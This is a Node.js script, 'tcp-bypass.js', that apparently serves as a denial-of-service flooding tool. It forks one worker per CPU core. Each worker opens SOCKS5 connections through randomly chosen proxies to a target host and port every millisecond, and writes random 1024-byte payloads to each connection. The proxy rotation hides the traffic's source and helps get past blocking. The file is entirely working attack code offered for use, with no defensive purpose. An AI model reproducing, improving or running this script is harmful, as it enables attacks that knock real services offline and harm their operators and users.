const net = require('net');
const cluster = require('cluster');
const crypto = require('crypto');
const fs = require('fs');
const SocksClient = require('socks').SocksClient;

process.setMaxListeners(0);
require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log('Usage: node tcp-bypass.js <target> <port> <duration> <proxy_file>');
    process.exit(0);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);
const proxyFile = process.argv[5];

let PROXYLIST = [];
if (fs.existsSync(proxyFile)) {
    PROXYLIST = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(a => a.trim() && a.includes(':'));
}

const generateRandomData = (size) => {
    return crypto.randomBytes(size);
};

const flood = async () => {
    if (PROXYLIST.length === 0) {
        console.log('No proxies loaded. Exiting...');
        process.exit(0);
    }

    setInterval(async () => {
        const proxy = PROXYLIST[Math.floor(Math.random() * PROXYLIST.length)];
        const [proxyHost, proxyPort] = proxy.split(':');

        try {
            const { socket } = await SocksClient.createConnection({
                proxy: {
                    host: proxyHost,
                    port: parseInt(proxyPort),
                    type: 5
                },
                command: 'connect',
                destination: {
                    host: target,
                    port: port
                }
            });

            socket.on('data', () => {
                // Keep connection alive
                socket.write(generateRandomData(1024));
            });

            // Initial data send
            socket.write(generateRandomData(1024));

            socket.on('error', () => {
                socket.destroy();
            });

            setTimeout(() => {
                socket.destroy();
            }, 10000); // Destroy socket after 10 seconds to prevent memory leaks

        } catch (error) {
            // Skip failed proxy
        }
    }, 1);
};

if (cluster.isMaster) {
    const numCPUs = require('os').cpus().length;
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    setTimeout(() => {
        process.exit(0);
    }, duration * 1000);
} else {
    flood();
} 